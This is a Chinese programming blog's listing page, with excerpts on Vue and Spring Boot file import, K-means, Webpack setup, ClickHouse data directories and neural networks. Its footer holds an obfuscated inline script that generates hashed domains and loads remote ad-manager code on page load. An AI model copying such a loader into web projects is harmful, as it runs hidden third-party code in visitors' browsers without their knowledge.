		&lt;el-upload action="#" :before-upload="handleBeforeUpload" :show-file-list="false" :headers="uploadData.headers" class="upload-file-uploader" :http-request="upAndDowndoad" &gt; &lt;el-button size="mini" type="primary"&gt;选取文件&lt;/el-button&gt; &lt;div class="el-upload__tip" slot="tip"&gt; 请上传 &lt;template v-if="uploadData.fileType"&gt; 格式为 &lt;b style="color: #f56c6c"&gt;{{ uploadData.fileType.join("/") }}&lt;/b&gt; &lt;/template&gt; 的文件 &lt;/div&gt; &lt;/el-upload&gt; upAndDowndoad(params){ var that=this; let form = new FormData() form.append('file', params.file) importOwnerAndHouse(form).then(response =&gt; { const isBlob = blobValidate(response); if (isBlob) { const blob = new Blob([response]) saveAs(blob, '业主房屋导入模板-需修改重新上传.xlsx') } else { response.text().then(data =&gt;{ var resp=JSON.parse(data); if(resp.code == 500){ this.$modal.msgError(resp.msg); }else{ that.$modal.msgSuccess(resp.msg); } }).catch(err =&gt;{ }) } }); } //导入业主和房屋 export function importOwnerAndHouse(data) { return request({ url: '/business/owner/importOwnerAndHouse', method: 'post', responseType: 'blob', data }) } @PostMapping("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d568c0775d5099a01c84ddab6acef2a2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8a45541daef41ec87ea635f79b8c1144/" rel="bookmark">
			K-means 聚类算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		K 均值聚类是一种流行的无监督机器学习算法，用于将数据集划分为 K 个不同的、不重叠的子集（聚类）。以下是有关 K 均值聚类的要点摘要：
目的：
最小化集群内差异：K-means 旨在最小化数据点与其各自的聚类质心之间的平方距离之和。它通过迭代地将数据点分配给聚类并更新聚类质心来实现此目的。 算法步骤：
初始化：随机选择 K 个数据点作为初始聚类质心。分配步骤：将每个数据点分配给最近的质心，形成 K 个聚类。更新步骤：重新计算质心作为每个聚类中数据点的平均值。迭 代：重复赋值和更新步骤，直到收敛（当质心不再发生重大变化时）。 簇数 （K）：
K 的选择至关重要，通常需要领域知识或其他技术（例如，弯头法或轮廓分析）来确定最佳值。 对初始质心的敏感性：
K-means 对初始质心选择敏感。不同的初始化可能会导致不同的最终集群。 缩放：
特征缩放非常重要，因为 K 均值是基于距离的。StandardScaler 通常用于标准化功能。 应用：
K-means广泛应用于各个领域，包括图像分割、客户分割、异常检测和文档聚类。 局限性：
对异常值的敏感度：K-means 对异常值很敏感，因为它们会显著影响聚类分配。假设是球形聚类：当聚类是球形、大小相等且密度相似时，K-means 效果很好，但对于大小不均匀或非球形聚类时，它可能难以处理。固定的簇数：该算法需要预先指定的簇数 （K）。 评估指标：
内部评估指标（例如，集群内的平方和）和外部指标（例如，调整后的兰德指数）可用于评估聚类结果的质量。 import pandas as pd import os os.environ['LOKY_MAX_CPU_COUNT'] = '4' # Set to the number of cores you want to use import os os.environ['OMP_NUM_THREADS'] = '1' beer = pd.read_csv('data.txt', sep=' ') print(beer) X=beer[['calories','sodium','alcohol','cost']] # K-means 聚类 from sklearn.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8a45541daef41ec87ea635f79b8c1144/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c7b0dee55d355224d3766f9a5e300e50/" rel="bookmark">
			Spring boot hutool poi 添加列的下拉选择列表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		@PostMapping("/downloadOwnerAndHouseTemplate") public void downloadOwnerAndHouseTemplate(HttpServletResponse response) throws Exception { LoginUser loginUser = SecurityUtils.getLoginUser(); String communityId = loginUser.getSysUser().getCommunityId(); if(StringUtils.isBlank(communityId)){ throw new ServiceException("用户未绑定小区,请重新登录重试"); } List&lt;String&gt; allUnitName=new ArrayList&lt;&gt;(); List&lt;BBuildingUnit&gt; list = bBuildingUnitService.lambdaQuery().eq(BBuildingUnit::getCommunityId, communityId) .eq(BBuildingUnit::getPid, 0).list(); for(BBuildingUnit unit:list){ List&lt;BBuildingUnit&gt; list1 = bBuildingUnitService.lambdaQuery() .eq(BBuildingUnit::getPid, unit.getId()).list(); List&lt;String&gt; collect = list1.stream().map(u -&gt; u.getName()).collect(Collectors.toList()); allUnitName.addAll(collect); } String[] strings = allUnitName.stream().toArray(String[]::new); //导出 ClassPathResource resource = new ClassPathResource("excelTemplate/ownerAndHouseTemplate.xlsx"); ExcelReader reader = cn.hutool.poi.excel.ExcelUtil.getReader(resource.getStream()); Sheet rows = reader.getSheets().get(0); //this.setDropDownBox((XSSFSheet) rows,new String[]{"参数1", "参数2", "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c7b0dee55d355224d3766f9a5e300e50/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aaf9c8b11c19305ebf2c4acb519baec3/" rel="bookmark">
			Webpack基础使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一.什么是Webpack
二.为什么要使用Webpack
三.Webpack的使用 1.下载yarn包管理器
2.Webpack的安装
3.Webpack的简单使用
4.效果
四.Webpack打包流程
一.什么是Webpack Webpack是一个静态模块打包工具
二.为什么要使用Webpack 在开发中，我们常常会遇到：
使用sass和less语法书写样式需要转译使用es6及更高版本的语法来简化代码,浏览器无法识别项目体积大,不利于上线 webpack就可以解决上述问题：
支持所有类型文件的打包支持less/sass =&gt; css支持ES6/7/8 =&gt; ES5压缩代码, 提高加载速度 由此可见，webpack就是前端开发人员技术库中的必需品
三.Webpack的使用 在使用前需要安装node环境
1.下载yarn包管理器 npm i -g yarn
2.Webpack的安装 首先创建项目文件夹并在项目文件夹内初始化包环境
yarn init -y
安装 webpack 依赖包
yarn add webpack webpack-cli -W -D
在 package.json 中, 配置 scripts 自定义打包命令
scripts: { "build": "webpack" } 3.Webpack的简单使用 新建 src/js.js ，写入并导出需要打包的代码，例如：
export const add = (a, b) =&gt; a + b 新建 src/index.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/aaf9c8b11c19305ebf2c4acb519baec3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a5dbd44f72fa688648fda631b961bc67/" rel="bookmark">
			把ClickHouse 的默认数据目录 /var/lib/clickhouse/修改为 /app/clickhouse
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		要将 ClickHouse 的数据目录修改为 /app/clickhouse，请按照以下步骤进行：
停止 ClickHouse 服务：
运行命令以停止 ClickHouse 服务。这可以防止在修改配置期间发生数据损坏。sudo service clickhouse-server stop 编辑配置文件：
使用文本编辑器（如 nano）打开 ClickHouse 的配置文件 config.xml。该文件通常位于 /etc/clickhouse-server/。sudo nano /etc/clickhouse-server/config.xml 修改数据目录路径：
在配置文件中，找到 &lt;path&gt; 和 &lt;tmp_path&gt; 标签。将这些标签的值更改为新的目录路径 /app/clickhouse。&lt;yandex&gt; ... &lt;path&gt;/app/clickhouse/&lt;/path&gt; &lt;tmp_path&gt;/app/clickhouse/tmp/&lt;/tmp_path&gt; ... &lt;/yandex&gt; 保存并关闭文件：
在 nano 中，按 Ctrl + O 保存更改，然后按 Ctrl + X 退出。 移动现有数据（如果适用）：
如果你的旧数据目录中已有数据，需要将其移动到新目录。使用以下命令：sudo mv /var/lib/clickhouse/* /app/clickhouse/ 设置正确的权限：
确保 ClickHouse 用户可以访问新的数据目录。更改目录的所有权和权限：sudo chown -R clickhouse:clickhouse /app/clickhouse sudo chmod -R 700 /app/clickhouse 重启 ClickHouse 服务：
一旦完成上述步骤，重新启动 ClickHouse 服务：sudo service clickhouse-server start 验证配置：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a5dbd44f72fa688648fda631b961bc67/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/61fc1d6604af83a284e85d9fd6226776/" rel="bookmark">
			【机器学习】深度学习与神经网络
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 人工神经网络（Artificial Neural Network, ANN ） 感知机：
激励函数 f(·)，也称转移函数、传输函数或限幅函数，其作用是将可能的无限域变换到指定的有限范围内进行输出。
常用的激励函数：
多层感知机：
输入层：接收输入信号的层。
输出层：产生输出信号的层。
中间层称为隐含层，不直接与外部环境打交道。隐含层的层数可从零到若干层。实际情况中，层与层之间可能有部分连接的情况。
激励函数应是非线性的，否则多层网络的计算能力并不比单层网络强。
前馈网络：没有层内联接，各结点前馈联接到下一层所有结点
反馈网络：结点的输出依赖于当前的输入，也依赖于自己以前的输出
前馈网络与反馈网络的比较： 前馈型网络“不存储记忆”，结点的输出仅仅是当前输出的加权和（再加激励）。在反馈网络中，要将以前的输出循环返回到输入。反馈网络类似于“人类的短期记忆”，即网络的输出状态部分取决于以前的输入。 2 卷积神经网络（Convolutional Neural Networks, CNN） 卷积神经网络是一类包含卷积计算且具有深度结构的前馈神经网络，广泛应用于图像处理。
2.1 CNN算法组成结构 CNN算法结构主要组成部分：卷积层、池化层、全连接层。
卷积层
简单讲，进行卷积计算，提取特征。
池化层
池化层基于局部相关性的思想，通过从局部相关的一组元素中进行采样或信息聚合，从而得到新的元素值。
作用：减少参数、降维、防止过拟合。
常见的池化方式：
（1）最大池化(Max Pooling)，从局部相关元素集中选取最大的一个元素值。
（2）平均池化(Average Pooling)，从局部相关元素集中计算平均值并返回。
全连接层
顾名思义，连接所有神经元，输出结果。
2.2 CNN两大核心 局部链接：每个神经元只与上一层的部分神经元相连。即，只让相关性较强（一般指的距离较近的）的神经元参与计算。
参数共享：同一个卷积核在计算中都是共享的。
3 循环神经网络（Recurrent Neural Network, RNN）&amp; 递归神经网络（Recursive Neural Network, RNN） 两者都简称为RNN，都可以处理序列数据。都主要都应用在在自然语言处理（Natural Language Processing, NLP）。但两者的算法结构不同。
想进一步了解可以看以下参考文章。
参考文章：
深度学习知识点全面总结
大话卷积神经网络（CNN）
大话循环神经网络（RNN）
百度百科：卷积神经网络
百度百科：循环神经网络
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/23/">«</a>
	<span class="pagination__item pagination__item--current">24/578</span>
	<a class="pagination__item pagination__item--next btn" href="/page/25/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>